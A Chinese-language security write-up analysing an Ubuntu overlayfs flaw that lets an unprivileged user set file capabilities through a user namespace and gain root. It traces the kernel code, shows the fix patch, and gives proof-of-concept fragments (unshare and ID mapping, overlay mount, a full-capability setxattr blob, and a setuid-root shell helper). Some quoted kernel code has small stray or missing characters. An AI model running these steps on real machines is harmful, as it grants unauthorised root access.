## 一、漏洞简介

### 漏洞背景

linux内核中的overlayfs文件系统没有正确根据用户命名空间校验 capability权限，从而导致普通用户可以利用该漏洞提升权限为root用户。

该漏洞NVD的打分为 **CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H** ，最终得分为7.8分（高危）。

漏洞影响范围为:

Ubuntu 20.10

Ubuntu 20.04 LTS

Ubuntu 18.04 LTS

Ubuntu 16.04 LTS

Ubuntu 14.04 ESM

### 漏洞成因

linux内核代码允许低权限用户在使用`unshare()`函数创建的用户命名空间中挂载overlayfs文件系统。当使用`setxattr()`函数设置merged联合挂载目录中文件的`security.capablility`扩展属性时，根据overlayfs文件系统的特性，将实际修改`init_user_ns`下upper目录中对应文件的扩展属性，从而造成本地提权问题。

## 二、基本概念

### 2.1 Overlayfs

Overlayfs是一个面向Linux的文件系统服务，其实现一个面向其他类型文件系统(如ext4fs、ext3fs等)的联合挂载，而不直接参与磁盘空间结构的划分。于2014年被合并到Linux内核的3.18版本，目前功能已经稳定且被逐渐推广，并在docker容器技术中得到广泛的应用。

如图所示，Overlayfs由两个文件系统组合而成：一个upper文件系统和一个lower文件系统，两种文件系统联合挂载成为一个目录。upper目录只能有一个，而lower可以有多个。upper目录中的文件会覆盖lower中的同名文件，比如图中merged目录中的file3目录最终显示的是upper目录中的file3目录。当存在多个lower目录时，高级别lower目录中的文件也会覆盖低级别lower目录中的文件。

upper目录可读可写，图中file3、file4文件的修改会被映射到upper中，比如删除或者修改操作。而lower目录是只读目录，file1和file2的改动不会影响到lower目录中的真实文件。当删除文件file1时，系统会创建一个删除标记，而不会真正删除lower中的文件。当改写lower层的文件时，系统会将文件拷贝至upper目录中进行修改，并隐藏lower目录中的同名文件。

![](https://image.3001.net/images/20210601/1622535743_60b5ee3fb1f08fbdac70d.png!small)

### 2.2 linux capabilities机制

Linux内核2.2引入了capabilities机制，并在后续使用中使用完善。该机制将root用户的权限细分为不同的领域，可以分别启用或禁用。在实际进行特权操作时，如果euid不是root，系统会校验该线程是否具有完成操作对应的capabilities特权。线程和文件均有capabilities的概念。

表格中列取了几个常见的capabilities作为例子。

capability 名称| 功能描述  
---|---  
CAP_CHOWN| 修改文件所有者的权限  
CAP_KILL| 允许对不属于自己的进程发送信号  
CAP_SETFCAP| 允许为文件设置任意的 capabilities  
CAP_SETUID| 允许改变进程的 UID  
CAP_SYS_ADMIN| 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等  
  
#### 2.2.1 线程的capabilities

每一个线程，具有3个capabilities的集合，分别是：

  *  **Permitted**

Permitted集合定义了线程的特权上限，如果执行操作所需要的capability不在该集合中，那么该线程不会进行对应的特权操作。Permitted集合是Inheritable和Effective集合的的超集。

  *  **Inheritable**

当执行`exec()`系统调用运行其他程序时，哪些特权能够被新线程继承capabilities。

  *  **Effective**

内核检查该线程是否可以进行特权操作时，检查的对象便是Effective集合。线程可以删除Effective集合中的某capability，随后在需要时，再从Permitted集合中恢复该capability，以此达到临时禁用capability的功能。

#### 2.2.2 文件的capabilities

文件的capabilities被记录在文件的拓展属性中。当某线程想修改这些扩展属性时，需要具有`CAP_SETFCAP`的capability。

  *  **Permitted**

文件被执行时加入其线程的Permitted集合。

  *  **Inheritable**

这个集合与线程的Inheritable集合的交集作为执行完`exec`后实际继承的capabilities。

  *  **Effective**

如果设置开启，那么在运行后，Permitted集合中新增的capabilities会自动出现在Effective集合中；否则不会出现在Effective集合中。对于一些旧的可执行文件，由于其不会调用capabilities相关函数设置自身的Effective集合，所以可以将该可执行文件的Effective
bit开启，从而将Permitted集合中的capabilities自动添加到Effective集合中。

  *  **ambient**

在内核4.3后引入，用于补充Inheritable使用上的缺陷，ambien集合可以使用函数prctl修改。当程序由于SUID(SGID)bit位而转变UID(GID)，或执行带有文件capabilities的程序时会导致该集合被清空

![](https://image.3001.net/images/20210601/1622535772_60b5ee5cc7d1fe442f213.png!small)

  

### 2.3 User namespace

User namespace 是 Linux 3.8 新增的一种 namespace，用于隔离安全相关的资源，包括 user IDs and group
IDs，keys, 和 capabilities。同样一个用户的 user ID 和 group ID 在不同的 user namespace
中可以不一样(与 PID nanespace 类似)。换句话说，一个用户可以在一个 user namespace 中是普通用户，但在另一个 user
namespace 中是超级用户。

系统启动时，就有一个默认的全局 init_user_ns，新创建一个 user namespace 会重新规划这个 ns 的 capability
能力，和这个 user namespace 父辈的 capability 能力无关。在新 user namespace 中 uid 0 等于 root
默认拥有所有 capability，普通用户的 capability 是在 execve() 时由
task->real_cred->cap_inheritable + file capability 综合而成。

![1622535788_60b5ee6cd1cc7db8fb8bd.png!small?1622535788490](https://image.3001.net/images/20210601/1622535788_60b5ee6cd1cc7db8fb8bd.png!small?1622535788490)

## 三、漏洞分析

### 3.1 环境信息

系统版本：Ubuntu 18.04.5 LTS

内核版本：4.15.18+

内核编译环境：

gcc version 7.5.0

GNU Make 4.1

### 3.2 创建挂载目录

首先生成`./poc`文件夹，以及`./poc/work`、`./poc/lower`、`./poc/upper`、`./poc/overlayfs`等子文件夹，作为Overlayfs的挂载点。

    
    
    #define DIR_WORK    "./poc/work"  
    #define DIR_LOWER   "./poc/lower"  
    #define DIR_UPPER   "./poc/upper"  
    #define DIR_OVERLAY   "./poc/overlayfs"  
    ​  
    static void xmkdir(const char *path, mode_t mode)  
    {  
    if (mkdir(path, mode) == -1 && errno != EEXIST)  
    err(1, "mkdir %s", path);  
    }  
    xmkdir(DIR_BASE, 0777);  
    xmkdir(DIR_WORK,  0777);  
    xmkdir(DIR_LOWER, 0777);  
    xmkdir(DIR_UPPER, 0777);  
    xmkdir(DIR_OVERLAY, 0777);

### 3.2 创建user namespace及cred

调用`unshare()`函数创建新的user namespace，以获取挂载Overlayfs并进行逃逸的权限。注意内核需要开启相关参数支持`user
namespace`隔离，`/boot/cpnfig-generic`配置文件中的`CONFIG_NAMESPACES、CONFIG_USER_NS`参数应为y。

    
    
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)  
    err(1, "unshare");

进入`SyS_unshare()`系统调用，调用内核`unshare_userns()`函数创建新的user namespace，以及对应的`struct
cred *cred`结构体。根据user namespace的特性，此时会重新规划线程的capabilities。

    
    
    int unshare_userns(unsigned long unshare_flags, struct cred **new_cred)  
    {  
    struct cred *cred;  
    int err = -ENOMEM;  
    if (!(unshare_flags & CLONE_NEWUSER))  
    return 0;  
    cred = prepare_creds();  
    if (cred) {  
    err = create_user_ns(cred);  
    if (err)  
    put_cred(cred);  
    else  
    *new_cred = cred;  
    }  
    return err;  
    }

进入`set_cred_user_ns()`函数，将`cap_effective`以及`cap_permitted`设置为CAP_FULL_SET。

    
    
    static void set_cred_user_ns(struct cred *cred, struct user_namespace *user_ns)  
    {  
    /* Start with the same capabilities as init but useless for doing  
    * anything as the capabilities are bound to the new user namespace.  
    */  
    cred->securebits = SECUREBITS_DEFAULT;  
    cred->cap_inheritable = CAP_EMPTY_SET;  
    cred->cap_permitted = CAP_FULL_SET;  
    cred->cap_effective = CAP_FULL_SET;  
    cred->cap_ambient = CAP_EMPTY_SET;  
    cred->cap_bset = CAP_FULL_SET;  
    #ifdef CONFIG_KEYS  
    key_put(cred->request_key_auth);  
    cred->request_key_auth = NULL;  
    #endif  
    /* tgcred will be cleared in our caller bc CLONE_THREAD won't be set */  
    cred->user_ns = user_ns;  
    }

该内核函数调用栈打印如下。

![](https://image.3001.net/images/20210601/1622535869_60b5eebd0aec29b99a083.png!small)

打印的`cred`结构体中`cap_permitted`以及`cap_effective`的值如下。

![](https://image.3001.net/images/20210601/1622535898_60b5eedadca6547ac5f2b.png!small)

`cred->user_ns`的值为`0xffff8881b4b8f050`，对应创建的ns。

![](https://image.3001.net/images/20210601/1622535959_60b5ef1756b2ea5bc1c50.png!small)

接下来在用户态中调用`xwritefile()`函数，将`/proc/self/setgroups`文件的值写为`deny`，`uid_map`值写为`0
1000 1`以及`gid_map`的值写为`0 1000
1`，表示将当前`uid=1000,guid=1000`的test用户映射为namespace中的root用户。注意，Linx
3.19后的内核调用中需要将`setgroups`设置成`deny`，以禁用`user
namespace`中的、`setgroups()`系统调用，才能更新`gid_maps`的值。否则修改会报`write
/proc/self/gid_map: Operation not permitted`的错。

    
    
    static void xwritefile(const char *path, const char *data)  
    {  
    int fd = open(path, O_WRONLY);  
    if (fd == -1)  
    err(1, "open %s", path);  
    ssize_t len = (ssize_t) strlen(data);  
    if (write(fd, data, len) != len)  
    err(1, "write %s", path);  
    close(fd);  
    }  
    ​  
    xwritefile("/proc/self/setgroups", "deny");  
    sprintf(buf, "0 %d 1", uid);  
    xwritefile("/proc/self/uid_map", buf);  
    sprintf(buf, "0 %d 1", gid);  
    xwritefile("/proc/self/gid_map", buf);

打印此时的`gid_map`以及`uid_map`映射文件，结果如下。

![1622536035_60b5ef630841b6bbf74c2.png!small?1622536034201](https://image.3001.net/images/20210601/1622536035_60b5ef630841b6bbf74c2.png!small?1622536034201)

  

### 3.4 挂载overlayfs文件系统

ubuntu内核`/fs/overlayfs/super.c`文件中的`ovl_fs_type`结构体设置了`fs_flags`字段，系统在执行`module_init`会进行加载。普通用户在低权限的user
namespace中挂载一个Overlayfs。

    
    
    static struct file_system_type ovl_fs_type = {  
    .owner        = THIS_MODULE,  
    .name        = "overlay",  
    .mount        = ovl_mount,  
    .kill_sb    = kill_anon_super,  
    .fs_flags    = FS_USERNS_MOUNT,  
    };  
    MODULE_ALIAS_FS("overlay");  
    static int __init ovl_init(void)  
    {  
    int err;  
    ovl_inode_cachep = kmem_cache_create("ovl_inode",  
    sizeof(struct ovl_inode), 0,  
    (SLAB_RECLAIM_ACCOUNT|  
    SLAB_MEM_SPREAD|SLAB_ACCOUNT),  
    ovl_inode_init_once);  
    if (ovl_inode_cachep == NULL)  
    return -ENOMEM;  
    err = register_filesystem(&ovl_fs_type);  
    if (err)  
    kmem_cache_destroy(ovl_inode_cachep);  
    return err;  
    }  
    module_init(ovl_init);

用户态中执行`mount()`函数挂载Overlayfs，参数中指定`lowerdir`为`./poc/lower`，`upperdir`为`./poc/upper`，`merged`为`./poc/overlayfs`文件夹。

    
    
    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);  
    if (mount("overlay", DIR_OVERLAY, "overlay", 0, buf) == -1)  
    err(1, "mount %s", DIR_OVERLAY);

`mount()`函数触发`SyS_mount`系统调用，并最终进入内核`sget_userns`函数校验此时的fs_flags值是否为FS_USERNS_MOUNT，以及是否具备CAP_SYS_ADMIN的权限，此处校验通过，Overlayfs正常挂载。

    
    
    //include/linux/fs.h  
    #define FS_USERNS_MOUNT     8   /* Can be mounted by userns root */  
    //fs/super.c  
    struct super_block *sget_userns(struct file_system_type *type,  
    int (*test)(struct super_block *,void *),  
    int (*set)(struct super_block *,void *),  
    int flags, struct user_namespace *user_ns,  
    void *data)  
    {  
    struct super_block *s = NULL;  
    struct super_block *old;  
    int err;  
    if (!(flags & (SB_KERNMOUNT|SB_SUBMOUNT)) &&  
    !(type->fs_flags & FS_USERNS_MOUNT) &&  
    !capable(CAP_SYS_ADMIN))  
    return ERR_PTR(-EPERM);  
    ...  
    return s;  
    }

执行该函数时，内核的调用栈如下。

![1622536051_60b5ef73ec6584679d27c.png!small?1622536054194](https://image.3001.net/images/20210601/1622536051_60b5ef73ec6584679d27c.png!small?1622536054194)

打印此时的type结构体可以观察`fs_flags`值被`module_init`设置为`0x8`。

![1622536062_60b5ef7e965ad2021228e.png!small?1622536061806](https://image.3001.net/images/20210601/1622536062_60b5ef7e965ad2021228e.png!small?1622536061806)

  

### 3.5 利用setxattr函数漏洞进行逃逸

编译生成提权shellcode，elevated_privileges.o，用于提权并获取shell，该文件源码如下。

    
    
    //提权文件elevated_privileges.o源码
    int main(int argc, char *argv[]){
    	setuid(0);    
    	setgid(0);   
    	execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
    }

拷贝`elevated_privileges.o`至`./poc/overlayfs/`文件夹，根据`overlayfs`的特性，`./poc/upper`会同时生成`elevated_privileges.o`文件。

    
    
    #define BIN_OVERLAY   "./poc/overlayfs/elevated_privileges.o" 
    xcopyfile("./elevated_privileges.o", BIN_OVERLAY, 0777);

在用户态中调用`setxattr()`函数，将`./poc/overlayfs/elevated_privileges.o`的设置扩展属性`security.capability`，获取提权权限，以使用`setuid()`和`setgid()`函数进行权限提升。

    
    
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
    if (setxattr(BIN_OVERLAY, "security.capability", cap, sizeof(cap) - 1, 0) == -1
    err(1, "setxattr %s", BIN_OVERLAY);

`value`字段对应的结构体位于`include/uapi/linux/capability.h`文件中。根据定义，effective
bit被设置为1，permitted被设置为`0xffffffff`，inheritable被设置为`0x00000000`。当执行shellcode时，线程将具备所有特权，包括`CAP_SETFCAP`特权，可进行提权。

    
    
    struct vfs_cap_data {
    	__le32 magic_etc;            /* Little endian */
    	struct {
    		__le32 permitted;    /* Little endian */
    		__le32 inheritable;  /* Little endian */
    	} data[VFS_CAP_U32];
    };

下面分析执行`setxattr()`函数的时候，内核的处理过程。

#### 3.5.1 绕过capability校验

该函数触发`SyS_setxattr`系统调用，并进入`path_setxattr()`函数。

    
    
    path_setxattr
    static int path_setxattr(const char __user *pathname,
                 const char __user *name, const void __user *value,
                 size_t size, int flags, unsigned int lookup_flags)
    {
        struct path path;
        int error;
    retry:
        error = user_path_at(AT_FDCWD, pathname, lookup_flags, &path);
        if (error)
            return error;
        error = mnt_want_write(path.mnt);
        if (!error) {
            error = setxattr(path.dentry, name, value, size, flags);
            mnt_drop_write(path.mnt);
        }
        path_put(&path);
        if (retry_estale(error, lookup_flags)) {
            lookup_flags |= LOOKUP_REVAL;
            goto retry;
        }
        return error;
    }

此时调用堆栈如下。

![1622536092_60b5ef9c7d57513f5be5c.png!small?1622536091812](https://image.3001.net/images/20210601/1622536092_60b5ef9c7d57513f5be5c.png!small?1622536091812)

打印`pathname`和`value`参数。

![1622536101_60b5efa5f3d71dca83167.png!small?1622536101178](https://image.3001.net/images/20210601/1622536101_60b5efa5f3d71dca83167.png!small?1622536101178)

![1622536113_60b5efb1c9b991f97c234.png!small?1622536112953](https://image.3001.net/images/20210601/1622536113_60b5efb1c9b991f97c234.png!small?1622536112953)

`path_setxattr()`会调用的`setxattr()`函数设置文件的扩展属性，该函数首先会执行`cap_convert_nscap()`检查权限，包括文件所属的`namespace`以及当前运行环境的`namespace`是否一致，以及当前用户是否具有`CAP_SETFCAP`的权限。

    
    
    static long
    setxattr(struct dentry *d, const char __user *name, const void __user *value,
         size_t size, int flags)
    {
    ...
            if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||
                (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))
                posix_acl_fix_xattr_from_user(kvalue, size);
            else if (strcmp(kname, XATTR_NAME_CAPS) == 0) {
                error = cap_convert_nscap(d, &kvalue, size);
                if (error < 0)
                    goto out;
                size = error;
            }
        }
    ...
    }

`cap_convert_nscap()`函数获取目录项对应的索引节点`inode`及`inode`所属的`username
space`。`current_user_ns()`返回目前运行的user
namespace，其值为`0xffff8881b4b8f050`，对应攻击者创建的user
namespace。由于采用`VFS_CAP_REVISION_2`版本，`if`语句中进入`ns_capable()`函数检查权限。

    
    
    int cap_convert_nscap(struct dentry *dentry, void **ivalue, size_t size)
    {
    ...
        struct inode *inode = d_backing_inode(dentry);
    
        struct user_namespace *task_ns = current_user_ns(),
            *fs_ns = inode->i_sb->s_user_ns;
    ...
        if (size == XATTR_CAPS_SZ_2)
            if (ns_capable(inode->i_sb->s_user_ns, CAP_SETFCAP))
                /* user is privileged, just write the v2 */
                return size;
    
    ...
    }

`ns_capable()`通过`ns_capable_common()`调用`security_capable()`。

    
    
    bool ns_capable(struct user_namespace *ns, int cap) 
    // ns_capable (ns=0xffff8881b516c3a0, cap=0x1f)
    {
    p (*(struct user_namespace *)0xffff8881b7186000)
        return ns_capable_common(ns, cap, CAP_OPT_NONE);
    }
    
    static bool ns_capable_common(struct user_namespace *ns,
                      int cap,
                      unsigned int opts)
    {
        int capable;
        if (unlikely(!cap_valid(cap))) {
            pr_crit("capable() called with invalid cap=%u\n", cap);
            BUG();
        }
        capable = security_capable(current_cred(), ns, cap, opts);
        struct cred
        if (capable == 0) {
            current->flags |= PF_SUPERPRIV;
            return true;
        }
        return false;
    
    }

在`security_capable()`中，内核通过hook机制，最终将当前的`cred`、`ns`等作为参数送给`cap_capable()`函数。

    
    
    int security_capable(const struct cred *cred,
                 struct user_namespace *ns,
                 int cap,
                 unsigned int opts)
    {
        return call_int_hook(capable, 0, cred, ns, cap, opts);
    }

打印此时的`security_hook_heads`链表，可找到对应的处理函数。

![1622536127_60b5efbfee3ea0147d467.png!small?1622536127237](https://image.3001.net/images/20210601/1622536127_60b5efbfee3ea0147d467.png!small?1622536127237)

`cap_capable`函数对比`inode`的`ns`值以及`cred->user_ns`值，确保文件`user namespace`和当前`user
namespace`一致，并且使用`cap_raised()`检查`cred->cap_effective`是否具有`CAP_SETFCAP`的权限。

    
    
    int cap_capable(const struct cred *cred, struct user_namespace *targ_ns,
            int cap, unsigned int opts)
      {
        struct user_namespace *ns = targ_ns;
             for (;;) {
           if (ns == cred->user_ns)
                return cap_raised(cred->cap_effective, cap) ? 0 : -EPERM;
    ...
        }
    }

打印此时的`cred->user_ns`，为`unshare`生成的user
namespace，内存为`0xffff8881b4b8f050`，并且`cap_effective`在`namespace`初始化时设置为`CAP_FULL_SET`，此处通过校验。

![1622536144_60b5efd0561a322328fa7.png!small?1622536143529](https://image.3001.net/images/20210601/1622536144_60b5efd0561a322328fa7.png!small?1622536143529)

![1622536150_60b5efd6b774b1db7fb30.png!small?1622536151060](https://image.3001.net/images/20210601/1622536150_60b5efd6b774b1db7fb30.png!small?1622536151060)

#### 3.5.2 利用overlayfs特性逃逸修改upper文件capability

返回`setxattr()`后调用`vfs_setxattr()`设置目录项的`security.capability`扩展属性。

    
    
    static long
    setxattr(struct dentry *d, const char __user *name, const void __user *value,
         size_t size, int flags)
    {
    ...
        error = vfs_setxattr(d, kname, kvalue, size, flags);
    out:
        kvfree(kvalue);
        return error;
    }

`__vfs_setxattr()`函数调用`xattr_resolve_name`，解析当前`inode`所使用的扩展属性处理函数。

    
    
    int
    __vfs_setxattr(struct dentry *dentry, struct inode *inode, const char *name,
               const void *value, size_t size, int flags)
    {
        const struct xattr_handler *handler;
    
        handler = xattr_resolve_name(inode, &name);
        if (IS_ERR(handler))
            return PTR_ERR(handler);
        if (!handler->set)
            return -EOPNOTSUPP;
        if (size == 0)
            value = "";  /* empty EA, do not remove */
        return handler->set(handler, dentry, inode, name, value, size, flags);//150
    }

根据`inode->i_sb->s_xattr`的值解析出对应的处理方法为`ovl_xattr_handlers`。

![1622536178_60b5eff20b8c54af1e148.png!small?1622536177213](https://image.3001.net/images/20210601/1622536178_60b5eff20b8c54af1e148.png!small?1622536177213)

最终进入`ovl_xattr_set`函数，此时调用路径如下。

![1622536186_60b5effa13506ba155c96.png!small?1622536185265](https://image.3001.net/images/20210601/1622536186_60b5effa13506ba155c96.png!small?1622536185265)

根据overlay的特性该函数会获取真正的目录项`realdentry`。

    
    
    int ovl_xattr_set(struct dentry *dentry, struct inode *inode, const char *name,
              const void *value, size_t size, int flags)
    {
        int err;
        struct dentry *upperdentry = ovl_i_dentry_upper(inode);
        struct dentry *realdentry = upperdentry ?: ovl_dentry_lower(dentry);
        const struct cred *old_cred;
    ...
        if (!upperdentry) {
            err = ovl_copy_up(dentry);
            if (err)
                goto out_drop_write;
    
            realdentry = ovl_dentry_upper(dentry);                                                                            //249行
        }
        old_cred = ovl_override_creds(dentry->d_sb);
        if (value)
            err = vfs_setxattr(realdentry, name, value, size, flags);                                                    //254行
        else {
            WARN_ON(flags != XATTR_REPL);
            err = vfs_removexattr(realdentry, name);
        }
    
    ...
    }

结构体`realdentry->d_parent->d_name`指向upper文件夹，表示`realdentry`位于`upper`文件夹下，`user
namespace`为初始的`init_user_ns`。接下来递归调用`vfs_setxattr`函数设置`realdentry`的扩展属性，造成`user
namespace`逃逸。

![1622536282_60b5f05ae21de8005ff4d.png!small?1622536282189](https://image.3001.net/images/20210601/1622536282_60b5f05ae21de8005ff4d.png!small?1622536282189)

![1622536291_60b5f0637d1e6a5cc5be6.png!small?1622536290683](https://image.3001.net/images/20210601/1622536291_60b5f0637d1e6a5cc5be6.png!small?1622536290683)

再次进入`__vfs_setxattr()`，`xattr_resolve_name()`函数解析出upper的处理方法为`ext4_xattr_security_set`方法。最终通过该方法将`./poc/upper/elevated_privileges.o`文件的capability设置成拥有全部特权的模式。

    
    
    int
    __vfs_setxattr(struct dentry *dentry, struct inode *inode, const char *name,
               const void *value, size_t size, int flags)
    {
        const struct xattr_handler *handler;c
    
        handler = xattr_resolve_name(inode, &name);
        if (IS_ERR(handler))
            return PTR_ERR(handler);
        if (!handler->set)
            return -EOPNOTSUPP;
        if (size == 0)
            value = "";  /* empty EA, do not remove */
        return handler->set(handler, dentry, inode, name, value, size, flags);//150
    }

###
![1622536316_60b5f07c14e02b514d4df.png!small?1622536315251](https://image.3001.net/images/20210601/1622536316_60b5f07c14e02b514d4df.png!small?1622536315251)

### 3.6 运行shellcode进行提权

观察`./poc/upper/elevated_privileges.o`文件的`security.capability`扩展字段，该字段已经被修改。

![1622536357_60b5f0a591d061f65c91c.png!small?1622536356790](https://image.3001.net/images/20210601/1622536357_60b5f0a591d061f65c91c.png!small?1622536356790)

运行该文件，提权为root。

![1622536368_60b5f0b0c1951d8081df3.png!small?1622536367944](https://image.3001.net/images/20210601/1622536368_60b5f0b0c1951d8081df3.png!small?1622536367944)

## 四、漏洞修复

补丁将`setxattr()`中的`cap_convert_nscap()`校验函数移动到了`vfs_setxattr()`中，设置任何目录项的`security.capability`扩展属性时，都会进行user
namespace和capability的校验，补丁具体信息如下。

    
    
    diff --git a/fs/xattr.c b/fs/xattr.c
    index cd7a563e8bcd4..fd57153b1f617 100644
    --- a/fs/xattr.c
    +++ b/fs/xattr.c
    @@ -276,8 +276,16 @@ vfs_setxattr(struct dentry *dentry, const char *name, const void *value,
     {
     	struct inode *inode = dentry->d_inode;
     	struct inode *delegated_inode = NULL;
    +	const void  *orig_value = value;
     	int error;
     
    +	if (size && strcmp(name, XATTR_NAME_CAPS) == 0) {
    +		error = cap_convert_nscap(dentry, &value, size);
    +		if (error < 0)
    +			return error;
    +		size = error;
    +	}
    +
     retry_deleg:
     	inode_lock(inode);
     	error = __vfs_setxattr_locked(dentry, name, value, size, flags,
    @@ -289,6 +297,9 @@ retry_deleg:
     		if (!error)
     			goto retry_deleg;
     	}
    +	if (value != orig_value)
    +		kfree(value);
    +
     	return error;
     }
     EXPORT_SYMBOL_GPL(vfs_setxattr);
    @@ -537,12 +548,6 @@ setxattr(struct dentry *d, const char __user *name, const void __user *value,
     		if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||
     		    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))
     			posix_acl_fix_xattr_from_user(kvalue, size);
    -		else if (strcmp(kname, XATTR_NAME_CAPS) == 0) {
    -			error = cap_convert_nscap(d, &kvalue, size);
    -			if (error < 0)
    -				goto out;
    -			size = error;
    -		}
     	}
     
     	error = vfs_setxattr(d, kname, kvalue, size, flags);

普通系统用户可通过升级系统至最新版本修复此漏洞。

### 作者：中兴沉烽实验室_流光奕然

